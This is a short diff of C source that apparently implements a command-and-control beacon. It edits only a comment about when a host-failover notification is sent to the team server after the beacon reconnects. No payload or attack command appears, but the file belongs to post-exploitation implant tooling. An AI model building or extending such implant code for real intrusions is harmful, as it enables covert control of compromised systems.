@@ -200,10 +200,11 @@ BOOL hostcfg_pick(char * host, int hmax, char * uri, int umax) {
  *
  * The notification is the operator's choice (beacon_config failover_notification
  * true; off by default) and goes out when a connection is re-established
- * after a failure, not at the move: a beacon that has not checked in yet has
- * no session to send with. It rides CALLBACK_HOST_FAILOVER - the frame the
- * client formats with BEACON_OUTPUT_HOST_FAILOVER - so the console adds its
- * own [+]; the text carries none. */
+ * after a failure - the manual's wording ("when a connection can be
+ * re-established"), and the first moment the team server can be sure the
+ * beacon is back. It rides CALLBACK_HOST_FAILOVER - the frame the client
+ * formats with BEACON_OUTPUT_HOST_FAILOVER - so the console adds its own
+ * [+]; the text carries none. */
 void hostcfg_note(const char * host, BOOL ok) {
 	int i;
 	extern void command_shell_callback(char * buffer, int length, int type);
